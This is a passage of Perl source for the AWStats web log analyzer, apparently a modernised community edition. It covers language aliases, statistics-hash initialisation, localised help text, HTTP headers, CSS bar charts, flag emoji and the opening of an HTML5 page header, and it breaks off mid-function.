	'iw'        => 'he',
	'hebrew'    => 'he',
	'il'        => 'he',
	
	# हिन्दी
	'hi'        => 'hi',
	'hindi'     => 'hi',
	
	# Hrvatski
	'hr'        => 'hr',
	'croatian'  => 'hr',
	
	# Magyar
	'hu'        => 'hu',
	'hungarian' => 'hu',
	
	# Bahasa Indonesia
	'id'        => 'id',
	'in'        => 'id',
	'indonesian'=> 'id',
	
	# Íslenska
	'is'        => 'is',
	'icelandic' => 'is',
	
	# Italiano
	'it'        => 'it',
	'italian'   => 'it',
	'it-it'     => 'it',
	'it_it'     => 'it',
	'it-IT'     => 'it',
	'it_IT'     => 'it',
	
	# 日本語
	'ja'        => 'ja',
	'jp'        => 'ja',
	'japanese'  => 'ja',
	'ja-jp'     => 'ja',
	'ja_jp'     => 'ja',
	'ja-JP'     => 'ja',
	'ja_JP'     => 'ja',
	
	# ქართული
	'ka'        => 'ka',
	'georgian'  => 'ka',
	'ge'        => 'ka',
	
	# ភាសាខ្មែរ
	'km'        => 'km',
	'kh'        => 'km',
	'cambodian' => 'km',
	'khmer'     => 'km',
	
	# ಕನ್ನಡ
	'kn'        => 'kn',
	'kannada'   => 'kn',
	
	# 한국어
	'ko'        => 'ko',
	'kr'        => 'ko',
	'korean'    => 'ko',
	'ko-kr'     => 'ko',
	'ko_kr'     => 'ko',
	'ko-KR'     => 'ko',
	'ko_KR'     => 'ko',
	'ko-kp'     => 'ko',
	'ko_kp'     => 'ko',
	'ko-KP'     => 'ko',
	'ko_KP'     => 'ko',
	'kp'        => 'ko',
	'north korean' => 'ko',
	
	# ພາສາລາວ
	'lo'        => 'lo',
	'lao'       => 'lo',
	'laotian'   => 'lo',
	
	# Lietuvių
	'lt'        => 'lt',
	'lithuanian'=> 'lt',
	
	# Latviešu
	'lv'        => 'lv',
	'latvian'   => 'lv',
	
	# Македонски
	'mk'        => 'mk',
	'macedonian'=> 'mk',
	
	# മലയാളം
	'ml'        => 'ml',
	'malayalam' => 'ml',
	
	# मराठी
	'mr'        => 'mr',
	'marathi'   => 'mr',

	# မြန်မာစာ
	'my'        => 'my',
	'mm'        => 'my',
	'burmese'   => 'my',
	'myanmar'   => 'my',
	
	# Norsk bokmål
	'nb'        => 'nb',
	'no'        => 'nb',
	'norwegian' => 'nb',
	
	# नेपाली
	'ne'        => 'ne',
	'np'        => 'ne',
	'nepali'    => 'ne',
	
	# Nederlands
	'nl'        => 'nl',
	'dutch'     => 'nl',
	'nl-nl'     => 'nl',
	'nl_nl'     => 'nl',
	'nl-NL'     => 'nl',
	'nl_NL'     => 'nl',
	'nl-be'     => 'nl',
	'nl_be'     => 'nl',
	'nl-BE'     => 'nl',
	'nl_BE'     => 'nl',
	
	# Norsk nynorsk
	'nn'        => 'nn',
	'nynorsk'   => 'nn',
	
	# ਪੰਜਾਬੀ
	'pa'        => 'pa',
	'punjabi'   => 'pa',
	
	# Polski
	'pl'        => 'pl',
	'polish'    => 'pl',
	
	# Română
	'ro'        => 'ro',
	'romanian'  => 'ro',
	
	# Русский
	'ru'        => 'ru',
	'russian'   => 'ru',
	'ru-ru'     => 'ru',
	'ru_ru'     => 'ru',
	'ru-RU'     => 'ru',
	'ru_RU'     => 'ru',
	# Հայերեն
	'hy'        => 'ru',
	'armenian'  => 'ru',
	
	# සිංහල
	'si'        => 'si',
	'sinhala'   => 'si',
	'sinhalese' => 'si',
	'lk'        => 'si',
	
	# Slovenčina
	'sk'        => 'sk',
	'slovak'    => 'sk',

	# Српски / Srpski
	'sr'           => 'sr',
	'sr-cyrl'      => 'sr',
	'sr-cyrillic'  => 'sr',
	'serbian'      => 'sr',
	'sr-latn'      => 'sr-latn',
	'sr-latin'     => 'sr-latn',
	'sr@latin'     => 'sr-latn',
	'serbian-latin'=> 'sr-latn',
	
	# Svenska
	'sv'        => 'sv',
	'se'        => 'sv',
	'swedish'   => 'sv',
	
	# தமிழ்
	'ta'        => 'ta',
	'tamil'     => 'ta',
	
	# తెలుగు
	'te'        => 'te',
	'telugu'    => 'te',
	
	# ภาษาไทย
	'th'        => 'th',
	'thai'      => 'th',
	
	# Tagalog
	'tl'        => 'tl',
	'fil'       => 'tl',
	'tagalog'   => 'tl',
	
	# Türkçe
	'tr'        => 'tr',
	'turkish'   => 'tr',

	# ئۇيغۇرچە
	'ug'        => 'ug',
	'uighur'    => 'ug',
	'uyghur'    => 'ug',
	
	# اردو
	'ur'        => 'ur',
	'urdu'      => 'ur',
	'urd'       => 'ur',
	'pk'        => 'ur',

	# O‘zbekcha
	'uz'        => 'uz',
	'uzbek'     => 'uz',
	
	# Tiếng Việt
	'vi'        => 'vi',
	'vietnamese'=> 'vi',
	'vn'        => 'vi',
);


@HostAliases = ();
@AllowAccessFromWebToFollowingAuthenticatedUsers = ();
@DefaultFile = ();
@SkipDNSLookupFor = ();
@SkipHosts = ();
@SkipUserAgents = ();
@NotPageFiles = ();
@SkipFiles = ();
@SkipReferrers = ();
@OnlyHosts = ();
@OnlyUserAgents = ();
@OnlyFiles = ();
@OnlyUsers = ();
@URLWithQueryWithOnly = ();
@URLWithQueryWithout = ();
@ExtraName = ();
@ExtraCondition = ();
@ExtraStatTypes = ();
@MaxNbOfExtra = ();
@MinHitExtra = ();
@ExtraFirstColumnTitle = ();
@ExtraFirstColumnValues = ();
@ExtraFirstColumnFunction = ();
@ExtraFirstColumnFormat = ();
@ExtraCodeFilter = ();
@ExtraConditionType = ();
@ExtraConditionTypeVal = ();
@ExtraFirstColumnValuesType = ();
@ExtraFirstColumnValuesTypeVal = ();
@ExtraAddAverageRow = ();
@ExtraAddSumRow = ();
@PluginsToLoad = ();
$color_success = '2ecc71';  # Green
$color_error   = 'e74c3c';  # Red
$color_warning = 'f39c12';  # Orange
%HTMLOutput = ();
%NoLoadPlugin = ();
%FilterIn = ();
%FilterEx = ();
%BadFormatWarning = ();
%MonthNumLib = ();
%ValidHTTPCodes = ();
%ValidSMTPCodes = ();
%TrapInfosForHTTPErrorCodes = ();
%NotPageList = ();
%DayBytes = ();
%DayHits = ();
%DayPages = ();
%DayVisits = ();
%MaxNbOf = ();
%MinHit = ();
%ListOfYears = ();
%HistoryAlreadyFlushed = ();
%PosInFile = ();
%ValueInFile = ();
%val = ();
%nextval = ();
%egal = ();
%TmpDNSLookup = ();
%TmpOS = ();
%TmpRefererServer = ();
%TmpRobot = ();
%TmpBrowser = ();
%MyDNSTable = ();
%TmpDevice = ();
#------------------------------------------------------------------------------
# Email Statistics Variable Initialization
#------------------------------------------------------------------------------
%_dkim_stats = ();
%_spf_stats = ();
%_dmarc_stats = ();
%_spam_low = ();
%_spam_high = ();
%_tls_version = ();
%_tls_cipher = ();
%_queue_delay = ();
%_mail_relay = ();
%_mail_mta = ();
#------------------------------------------------------------------------------
# Function:     Reset all runtime statistics hashes and arrays
# Description:  - Clears all hash/array variables used for accumulating statistics
#               - Called before reading/updating history files, after flush, and during log processing
#               - Does NOT depend on $YearRequired or $MonthRequired (despite parameter naming)
# Parameters:   None
# Input:        Global hashes starting with _ (e.g., %_host_h, %_url_p, %DayPages)
# Output:       All such hashes and arrays reset to empty state
# Return:       None
#------------------------------------------------------------------------------
sub Init_HashArray {
	if ($Debug) { debug("Call to Init_HashArray"); }

	# Reset global hash arrays
	%FirstTime           = %LastTime           = ();
	%MonthHostsKnown     = %MonthHostsUnknown  = ();
	%MonthVisits         = %MonthUnique        = ();
	%MonthPages          = %MonthHits          = %MonthBytes = ();
	%MonthNotViewedPages = %MonthNotViewedHits = %MonthNotViewedBytes = ();
	%DayPages            = %DayHits            = %DayBytes = %DayVisits = ();
	%_protocol_h         = ();
	%_protocol_k         = ();
	%_icon_status = ();

	# Reset all arrays with name beginning by _
	for ( my $ix = 0 ; $ix < 6 ; $ix++ ) {
		$_from_p[$ix] = 0;
		$_from_h[$ix] = 0;
	}
	for ( my $ix = 0 ; $ix < 24 ; $ix++ ) {
		$_time_h[$ix]    = 0;
		$_time_k[$ix]    = 0;
		$_time_p[$ix]    = 0;
		$_time_nv_h[$ix] = 0;
		$_time_nv_k[$ix] = 0;
		$_time_nv_p[$ix] = 0;
	}

	# Reset all hash arrays with name beginning by _
	%_session     = %_browser_h   = %_browser_p   = ();
	%_filesize = ();
	%_requesttime = ();
	%_domener_p   = %_domener_h   = %_domener_k = %_errors_h = %_errors_k = ();
	%_filetypes_h = %_filetypes_k = %_filetypes_gz_in = %_filetypes_gz_out = ();
	%_host_p = %_host_h = %_host_k = %_host_l = %_host_s = %_host_u = ();
	%_waithost_e = %_waithost_l = %_waithost_s = %_waithost_u = ();
	%_keyphrases = %_keywords   = %_os_h = %_os_p = 
	%_device_h = %_device_p = %_mobile_os_h = %_mobile_os_p = %_pagesrefs_p = %_pagesrefs_h =
	%_robot_h  = %_robot_k    = %_robot_l = %_robot_r = ();
	%_worm_h = %_worm_k = %_worm_l = %_login_p = %_login_h = %_login_k =
	%_login_l      = %_screensize_h   = ();
	%_cluster_p      = %_cluster_h      = %_cluster_k = ();
	%_se_referrals_p = %_se_referrals_h = %_sider_h = %_referer_h = %_err_host_h =
	%_url_p        = %_url_k          = %_url_e = %_url_x = ();
	%_downloads = ();
	%_unknownreferer_l = %_unknownrefererbrowser_l = ();
	%_emails_h = %_emails_k = %_emails_l = %_emailr_h = %_emailr_k =
	%_emailr_l = ();

	for ( my $ix = 1 ; $ix < @ExtraName ; $ix++ ) {
		%{ '_section_' . $ix . '_h' }   = %{ '_section_' . $ix . '_o' } =
		  %{ '_section_' . $ix . '_k' } = %{ '_section_' . $ix . '_l' } =
		  %{ '_section_' . $ix . '_p' } = ();
	}
	foreach my $pluginname ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } )
	{
		# my $function="SectionInitHashArray_$pluginname()";
		# eval("$function");
		my $function = "SectionInitHashArray_$pluginname";
		&$function();
	}
}

# Call the initialization function
Init_HashArray();
$regclean1 = qr/<(recnb|\/td)>/i;
$regclean2 = qr/<\/?[^<>]+>/i;
$regdate   = qr/(\d\d\d\d)(\d\d)(\d\d)(\d\d)(\d\d)(\d\d)/;

#------------------------------------------------------------------------------
# Function:     detect_terminal_language - Detect terminal language from environment
# Description:  Determines the user's language preference by checking environment
#               variables (LANG, LANGUAGE, LC_ALL, LC_MESSAGES). Returns a supported
#               language code if found, otherwise returns undef.
# Parameters:   None
# Input:        Environment variables: LANG, LANGUAGE, LC_ALL, LC_MESSAGES
# Output:       None
# Return:       Language code (e.g., 'zh-cn', 'en-us', 'fr') or undef if not detected
# Note:         Supported languages are defined in @supported array
#               Handles both full codes (e.g., 'zh_CN.UTF-8' -> 'zh-cn') and primary codes
#------------------------------------------------------------------------------
sub detect_terminal_language {
	my $lang = $ENV{'LANG'} || $ENV{'LANGUAGE'} || $ENV{'LC_ALL'} || $ENV{'LC_MESSAGES'} || '';
	return undef if !$lang;
	$lang =~ s/\..*$//;
	$lang =~ s/_/-/g;
	$lang = lc($lang);
	my @supported = qw(
			am ar az be bg bn br bs ca cs cy da de el
			es et eu fa fi fr ga gl gu he hi hr hu hy id
			is it ja ka kk km kn ko lo lt lv mk ml mn mr
			ms my nb ne nl nn or pa pl ps pt ro ru si sk
			sl sq sr sv sw ta te th tl tr ug uk ur uz vi
			pt-br sr-latn zh-cn zh-tw en-us en-gb en-ca 
	);
	foreach (@supported) {
		if ($_ eq $lang) {
			return $lang;
		}
	}
	my $primary = (split /-/, $lang)[0];
	foreach (@supported) {
		if ($_ eq $primary) {
			return $primary;
		}
	}
	
	return undef;
}
#------------------------------------------------------------------------------
# Function:     print_help - Display command line help information
# Description:  Outputs AWStats command line usage instructions, including:
#               - Syntax format
#               - Options for updating statistics (-update, -showsteps, -showcorrupted, etc.)
#               - Options for generating reports (-output, -staticlinks, -lang, etc.)
#               - Other options (-debug, -version)
#               - List of detected features (browsers, operating systems, search engines, etc.)
# Parameters:   None
# Input:        $PROG (program name), $VERSION (version number), language from detect_terminal_language()
# Output:       Help text to STDOUT
# Return:       None
# Note:         Supports multiple languages, displays help based on terminal language settings
#------------------------------------------------------------------------------
sub print_help {
	my $term_lang = detect_terminal_language();
	$Lang = $term_lang || 'en-us';
	binmode(STDOUT, ':utf8');
	Read_Language_Data($Lang);
	Read_Ref_Data('domains', 'robots', 'worms', 'operating_systems', 'browsers', 'search_engines');
	# 获取翻译文本
	my $title = sprintf(_t("AWStats %s - Advanced Web Statistics"), $VERSION);
	my $copyright1 = _t("Copyright (c) 2000-2025 Laurent Destailleur");
	my $copyright2 = _t("Copyright (c) 2026-latest Community Edition");
	my $warranty = _t("AWStats comes with ABSOLUTELY NO WARRANTY. It's a free software distributed with a GNU General Public License (See LICENSE file for details).");
	
	my $syntax = sprintf(_t("Syntax: %s -config=virtualhostname [options]"), $PROG);
	
	my $desc1 = sprintf(_t("This runs %s in command line to update statistics (-update option) of a web site, from the log file defined in AWStats config file, or build a HTML report (-output option)."), $PROG);
	my $desc2 = sprintf(_t("First, %s tries to read %s.virtualhostname.conf as the config file. If not found, %s tries to read %s.conf, and finally the full path passed to -config="), $PROG, $PROG, $PROG, $PROG);
	
	my $note1 = _t("Note 1: Config files (*.conf) must be in /etc/awstats, /usr/local/etc/awstats, /etc or same directory than awstats.pl script file.");
	my $note2 = _t("Note 2: If AWSTATS_FORCE_CONFIG environment variable is defined, AWStats will use it as the 'config' value, whatever is the value on command line or URL.");
	my $note3 = _t("See AWStats documentation for all setup instructions.");
	
	my $update_title = _t("Options to update statistics:");
	my $update_update = _t("  -update        to update statistics (default)");
	my $update_steps = sprintf(_t("  -showsteps     to add benchmark information every %s lines processed"), $NBOFLINESFORBENCHMARK);
	my $update_corrupted = _t("  -showcorrupted to add output for each corrupted lines found, with reason");
	my $update_dropped = _t("  -showdropped   to add output for each dropped lines found, with reason");
	my $update_unknown = _t("  -showunknownorigin  to output referer when it can't be parsed");
	my $update_direct = _t("  -showdirectorigin   to output log line when origin is a direct access");
	my $update_for = _t("  -updatefor=n   to stop the update process after parsing n lines");
	my $update_logfile = _t("  -LogFile=x     to change log to analyze whatever is 'LogFile' in config file");
	my $update_warn = _t("  Be care to process log files in chronological order when updating statistics.");
	
	my $output_title = _t("Options to show statistics:");
	my $output_main = _t("  -output      to output main HTML report (no update made except with -update)");
	my $output_x = _t("  -output=x    to output other report pages where x is:");
	
	my $output_options = [
		["alldomains", _t("build page of all domains/countries")],
		["allhosts", _t("build page of all hosts")],
		["lasthosts", _t("build page of last hits for hosts")],
		["unknownip", _t("build page of all unresolved IP")],
		["allemails", _t("build page of all email senders (maillog)")],
		["lastemails", _t("build page of last email senders (maillog)")],
		["allemailr", _t("build page of all email receivers (maillog)")],
		["lastemailr", _t("build page of last email receivers (maillog)")],
		["alllogins", _t("build page of all logins used")],
		["lastlogins", _t("build page of last hits for logins")],
		["allrobots", _t("build page of all robots/spider visits")],
		["lastrobots", _t("build page of last hits for robots")],
		["urldetail", _t("list most often viewed pages")],
		["urldetail:filter", _t("list most often viewed pages matching filter")],
		["urlentry", _t("list entry pages")],
		["urlentry:filter", _t("list entry pages matching filter")],
		["urlexit", _t("list exit pages")],
		["urlexit:filter", _t("list exit pages matching filter")],
		["osdetail", _t("build page with os detailed versions")],
		["browserdetail", _t("build page with browsers detailed versions")],
		["unknownbrowser", _t("list 'User Agents' with unknown browser")],
		["unknownos", _t("list 'User Agents' with unknown OS")],
		["refererse", _t("build page of all refering search engines")],
		["refererpages", _t("build page of all refering pages")],
		["keyphrases", _t("list all keyphrases used on search engines")],
		["keywords", _t("list all keywords used on search engines")],
		["errors404", _t("list 'Referers' for 404 errors")],
		["allextraX", _t("build page of all values for ExtraSection X")],
	];
	
	my $staticlinks = _t("  -staticlinks           to have static links in HTML report page");
	my $staticlinksext = _t("  -staticlinksext=xxx    to have static links with .xxx extension instead of .html");
	my $lang_opt = _t("  -lang=LL     to output a HTML report in language LL (en,de,es,fr,it,nl,zh-cn,...)");
	my $month_opt = _t("  -month=MM    to output a HTML report for an old month MM");
	my $year_opt = _t("  -year=YYYY   to output a HTML report for an old year YYYY");
	my $date_note = _t("  The 'date' options doesn't allow you to process old log file. They only allow you to see a past report for a chosen month/year period instead of current month/year.");
	
	my $other_title = _t("Other options:");
	my $debug_opt = _t("  -debug=X     to add debug informations lesser than level X (speed reduced)");
	my $version_opt = _t("  -version     show AWStats version");
	
	my $supports_title = _t("Now supports/detects:");
	
	my @features = (
		_t("  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)"),
		_t("  Reverse DNS lookup (IPv4 and IPv6) and GeoIP lookup"),
		_t("  Number of visits, number of unique visitors"),
		_t("  Visits duration and list of last visits"),
		_t("  Authenticated users"),
		_t("  Days of week and rush hours"),
		_t("  Hosts list and unresolved IP addresses list"),
		_t("  Most viewed, entry and exit pages"),
		_t("  Files type and Web compression (mod_gzip, mod_deflate stats)"),
		_t("  Configured Database Statistics"),
		sprintf(_t("  %s domains/countries"), scalar keys %DomainsHashIDLib),
		sprintf(_t("  %s robots"), scalar keys %RobotsHashIDLib),
		sprintf(_t("  %s worm's families"), scalar keys %WormsHashLib),
		sprintf(_t("  %s operating systems"), scalar keys %OSHashLib),
	);
	
	# 获取浏览器统计
	my $browser_count = scalar keys %BrowsersHashIDLib;
	&Read_Ref_Data('browsers_phone');
	my $browser_total = scalar keys %BrowsersHashIDLib;
	my $browser_text = sprintf(_t("  %s browsers (%s with phone browsers database)"), $browser_count, $browser_total);
	
	my $se_text = sprintf(_t("  %s search engines (and keyphrases/keywords used from them)"), scalar keys %SearchEnginesHashLib);
	
	my @more_features = (
		_t("  All HTTP errors with last referrer"),
		_t("  Report by day/month/year"),
		_t("  Dynamic or static HTML or XHTML reports, static PDF reports"),
		_t("  Indexed text or XML monthly database"),
		_t("  And a lot of other advanced features and options..."),
	);
	
	my $footer = _t("  New versions and FAQ at http://www.awstats.org");
	
	# 输出帮助信息
	print "\n";
	print "═══════════════════════════════════════════════════════════════════════════\n";
	print "  $title\n";
	print "  $copyright1\n";
	print "  $copyright2\n";
	print "═══════════════════════════════════════════════════════════════════════════\n";
	print "\n";
	print "  $warranty\n";
	print "\n";
	print "  $syntax\n";
	print "\n";
	print "  $desc1\n";
	print "  $desc2\n";
	print "\n";
	print "  $note1\n";
	print "  $note2\n";
	print "  $note3\n";
	print "\n";
	
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $update_title\n";
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $update_update\n";
	print "  $update_steps\n";
	print "  $update_corrupted\n";
	print "  $update_dropped\n";
	print "  $update_unknown\n";
	print "  $update_direct\n";
	print "  $update_for\n";
	print "  $update_logfile\n";
	print "  $update_warn\n";
	print "\n";
	
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $output_title\n";
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $output_main\n";
	print "  $output_x\n";
	
	foreach my $opt (@$output_options) {
		printf "    %-20s %s\n", $opt->[0], $opt->[1];
	}
	
	print "\n";
	print "  $staticlinks\n";
	print "  $staticlinksext\n";
	print "  $lang_opt\n";
	print "  $month_opt\n";
	print "  $year_opt\n";
	print "  $date_note\n";
	print "\n";
	
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $other_title\n";
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $debug_opt\n";
	print "  $version_opt\n";
	print "\n";
	
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $supports_title\n";
	print "───────────────────────────────────────────────────────────────────────────\n";
	
	foreach my $feature (@features) {
		print "  $feature\n";
	}
	print "  $browser_text\n";
	print "  $se_text\n";
	
	foreach my $feature (@more_features) {
		print "  $feature\n";
	}
	print "\n";
	
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "  $footer\n";
	print "───────────────────────────────────────────────────────────────────────────\n";
	print "\n";
}
#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------
# Function to solve pb with openvms
sub file_filt (@) {
	my @retval;
	foreach my $fl (@_) {
		$fl =~ tr/^//d;
		push @retval, $fl;
	}
	return sort @retval;
}

#------------------------------------------------------------------------------
# Function:     Send HTTP headers (modern version)
# Parameters:   None
# Input:        $HeaderHTTPSent, $PageCode
# Output:       $HeaderHTTPSent=1
# Return:       None
#------------------------------------------------------------------------------
sub http_head {
	return if $HeaderHTTPSent;
		print "Content-type: text/html; charset=utf-8\n";
		print "X-Content-Type-Options: nosniff\n";
		print "X-Frame-Options: SAMEORIGIN\n";
		print "Referrer-Policy: no-referrer-when-downgrade\n";
		if ( $Expires =~ /^\d+$/ ) {
			print "Cache-Control: public, max-age=$Expires\n";
			print "Last-Modified: " . gmtime($starttime) . "\n";
			print "Expires: " . ( gmtime( $starttime + $Expires ) ) . "\n";
		} else {
			print "Cache-Control: no-cache, must-revalidate\n";
		}
		print "\n";
	$HeaderHTTPSent++;
}


#------------------------------------------------------------------------------
# Function:     Get translated text
# Parameters:   Message ID or string
# Return:       Translated text
#------------------------------------------------------------------------------
sub _t {
	my $msgid = shift;
	if ( $msgid =~ /^\d+$/ && defined $Message[$msgid] ) {
		return $Message[$msgid];
	}
	if ( defined $translate_map{$msgid} ) {
		return $translate_map{$msgid};
	}
	return $msgid;
}

# ------------------------------------------------------------------------------
# Pure CSS progress bar (replaces original PNG images)
# The original AWStats used PNG images like /awstatsicons/other/hp.png, hh.png, hk.png to generate bar charts
# Each image required a separate HTTP request and could not adapt to dark mode
# This function uses pure CSS + inline styles to generate horizontal progress bars, replacing the original PNG-based solution
#
# Original approach example:
#   <img src="/awstatsicons/other/hp.png" height="5" width="260">
#
# New approach:
#   ProgressBarH($width, 'color_p')  → <div style="background-color: #4477DD; width: 260px; ..."></div>
#
# Advantages:
#   - No additional HTTP requests
#   - Supports dark mode (CSS variables adapt automatically)
#   - Rounded corners for a more modern visual effect
#   - Width can be calculated dynamically with higher precision
# ------------------------------------------------------------------------------
sub ProgressBarH {
	my ($width, $color_var) = @_;
	my $color = eval("\$$color_var");
	$width = 1 if $width < 1;
	return "<div style=\"background-color: #$color; width: ${width}px; height: 5px; border-radius: 3px;\"></div>";
}

# ------------------------------------------------------------------------------
# Pure CSS vertical bar chart (replaces original PNG images)
# The original AWStats used PNG images like /awstatsicons/other/vu.png, vv.png, vp.png, vh.png, vk.png
# to generate stacked bar charts for monthly/daily/hourly statistics, with each bar consisting of multiple PNG images stacked vertically
#
# Original approach example (monthly statistics):
#   <img src="/awstatsicons/other/vu.png" height="12" width="6">
#   <img src="/awstatsicons/other/vv.png" height="80" width="6">
#   <img src="/awstatsicons/other/vp.png" height="88" width="6">
#   <img src="/awstatsicons/other/vh.png" height="91" width="6">
#   <img src="/awstatsicons/other/vk.png" height="91" width="6">
#   (Each bar required 5 separate image requests; multiple bars meant 5×N requests)
#
# New approach:
#   ProgressBarV($height, 'color_u')  → <div style="background-color: #FFB055; width: 6px; height: 12px; ..."></div>
#   ProgressBarV($height, 'color_v')  → <div style="background-color: #F8E880; width: 6px; height: 80px; ..."></div>
#   ProgressBarV($height, 'color_p')  → <div style="background-color: #4477DD; width: 6px; height: 88px; ..."></div>
#   ...
#
# Advantages:
#   - Each bar requires only 1 request (entire page CSS inline or external)
#   - Supports dark mode (CSS variables adapt automatically)
#   - Multiple bars arranged horizontally without complex image stacking logic
#   - Rounded corners for a more modern visual effect
#   - Height can be calculated dynamically with higher precision
#   - Hover displays specific values (with title attribute)
# ------------------------------------------------------------------------------
sub ProgressBarV {
	my ($height, $color_var) = @_;
	my $color = eval("\$$color_var");
	$height = 1 if $height < 1;
	return "<div style=\"background-color: #$color; width: 6px; height: ${height}px; border-radius: 2px; display: inline-block; margin: 0 1px;\"></div>";
}

#------------------------------------------------------------------------------
# Function:     Convert country code to flag emoji
# Description:  - Maps non-standard codes: UK→GB, EU→EU (special case)
#               - Unknown/IP (IP/UNKNOWN) returns rainbow flag 🏳️‍🌈
#               - Converts A-Z to regional indicator symbols (U+1F1E6..U+1F1FF)
#               - Any 2-letter code becomes an emoji flag
# Note:         Flag display varies by OS; Windows may show letters instead
# Parameters:   $country_code (2-letter ISO code)
# Return:       Flag emoji as HTML span (font-size:24px)
#------------------------------------------------------------------------------
sub country_code_to_emoji {
	my $code = uc(shift);
	
	# Special handling of unknown or special codes
	return '<span style="font-size:24px;">🏳️‍🌈</span>' if ($code eq 'IP' || $code eq 'UNKNOWN' || !$code);
	
	# Mapping Non-Standard Country Codes to Standard Codes
	my %code_map = (
		'UK' => 'GB',
		'EU' => 'EU',
	);
	if (exists $code_map{$code}) {
		$code = $code_map{$code};
	}
	
	# Convert letters to regional indicator symbols
	# Principle: A -> 0x1F1E6, B -> 0x1F1E7, etc.
	my $emoji = '';
	for my $char (split //, $code) {
		my $ord = ord($char) - ord('A');
		$emoji .= chr(0x1F1E6 + $ord);
	}
	
	return '<span style="font-size:24px;">' . $emoji . '</span>';
}

#------------------------------------------------------------------------------
# Function:     Write HTML5 header with complete page structure
# Description:  Generates the entire HTML <head> section and page scaffolding:
#               - DOCTYPE, html lang/dir attributes, meta tags (charset, viewport, robots, expires)
#               - Favicons (multiple sizes, SVG data URI)
#               - Page title and description (translated)
#               - CSS (either external $StyleSheet or inline get_modern_css)
#               - Theme toggle button (dark/light mode) with localStorage persistence
#               - Documentation viewer frame bar and container (hidden by default)
#               - Dropdown navigation menu with categorized doc links (basic, guide, reference, etc.)
#               - Back-to-top button (SVG + text)
#               - Plugin hooks (AddHTMLHeader)
#               - Opens <body> and .aws-container for main content
# Parameters:   None
# Input:        %HTMLOutput, $PluginMode, $Lang, $StyleSheet, $PageDir, $VERSION,
#               $SiteDomain, $YearRequired, $MonthRequired, etc.
# Output:       $HeaderHTMLSent=1, full HTML header and body opening tags
# Return:       None
#------------------------------------------------------------------------------
sub html_head {
	return if $NOHTML;
	return unless ( scalar keys %HTMLOutput || $PluginMode );

	my $dir = $PageDir ? 'rtl' : 'ltr';

	# --- 1. Optimize Period Title Construction ---
	my $periodtitle = " ($YearRequired";
	$periodtitle .= "-$MonthRequired" if $MonthRequired ne 'all';
	$periodtitle .= "-$DayRequired"   if $DayRequired   ne '';
	$periodtitle .= "-$HourRequired"  if $HourRequired  ne '';
	$periodtitle .= ")";

	# --- 2. HTML5 Standard Headers (Modern DocType & Meta) ---
	print "<!DOCTYPE html>\n";
	print "<html lang=\"$Lang\" dir=\"$dir\">\n";
	print "<head>\n";
	print "<meta charset=\"utf-8\">\n";
	print "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
	print "<meta name=\"generator\" content=\"AWStats $VERSION\">\n";

	# --- 3. Clean SVG Favicon Injection via Here-Doc ---
	print <<"EOF_FAVICON";
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text x='50' y='55' font-size='50' text-anchor='middle'>📊</text></svg>">
<link rel="icon" type="image/svg+xml" sizes="16x16" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 100 100'><text x='50' y='55' font-size='50' text-anchor='middle'>📊</text></svg>">
<link rel="apple-touch-icon" sizes="180x180" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='180' height='180' viewBox='0 0 100 100'><text x='50' y='55' font-size='50' text-anchor='middle'>📊</text></svg>">
<link rel="icon" sizes="192x192" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='192' height='192' viewBox='0 0 100 100'><text x='50' y='55' font-size='50' text-anchor='middle'>📊</text></svg>">
<link rel="icon" sizes="512x512" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='512' height='512' viewBox='0 0 100 100'><text x='50' y='55' font-size='50' text-anchor='middle'>📊</text></svg>">
<link rel="manifest" href="$DirIcons/os/site.webmanifest">
EOF_FAVICON

	# --- 4. Robots Rule Controller ---
	if ($MetaRobot) {
		my $index  = ($FrameName eq 'mainleft') ? 'noindex' : 'index';
		my $follow = ($FrameName eq 'mainleft' || $FrameName eq 'index') ? 'follow' : 'nofollow';
		print "<meta name=\"robots\" content=\"$index, $follow\">\n";
	} else {
		print "<meta name=\"robots\" content=\"noindex, nofollow\">\n";
	}

	# --- 5. RFC 1123 HTTP-Compliant Expires Meta ---
	if ($Expires) {
		my $expires_gmt = strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime($starttime + $Expires));
		print "<meta http-equiv=\"expires\" content=\"$expires_gmt\">\n";
	}

	# --- 6. Page SEO Metadata & Title Generation ---
	my @k = keys %HTMLOutput;
	my $description = sprintf("%s - %s %s%s%s", 
		ucfirst($PROG),
		_t("Advanced Web Statistics for"),
		$SiteDomain,
		$periodtitle,
		($k[0] ? " - " . _t($k[0]) : "")
	);
	print "<meta name=\"description\" content=\"$description\">\n";

	if ( $MetaRobot && $FrameName ne 'mainleft' ) {
		print "<meta name=\"keywords\" content=\"$SiteDomain, web statistics, log analyzer, traffic analysis\">\n";
	}

	my $title = sprintf("%s %s%s", 
		_t("Statistics for"),
		$SiteDomain,
		($k[0] ? " - " . _t($k[0]) : "")
	);
	print "<title>$title</title>\n";

	# --- 7. Stylesheets Injection ---
	if ( $FrameName ne 'index' ) {
		if ($StyleSheet) {
			print "<link rel=\"stylesheet\" href=\"$StyleSheet\">\n";
		} else {
			# Modern CSS injection interface
			print get_modern_css($dir);
		}
		
		# UI Pre-translations
		my $light_mode_text = _t("Switch to light mode");
		my $dark_mode_text  = _t("Switch to dark mode");
	}

	# --- 8. Extensible Plugins Hook ---
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLHeader'} } ) {
		my $function = "AddHTMLHeader_$pluginname";
		no strict 'refs';
		&$function();
	}

	print "</head>\n";
	
	if ( $FrameName ne 'index' ) {
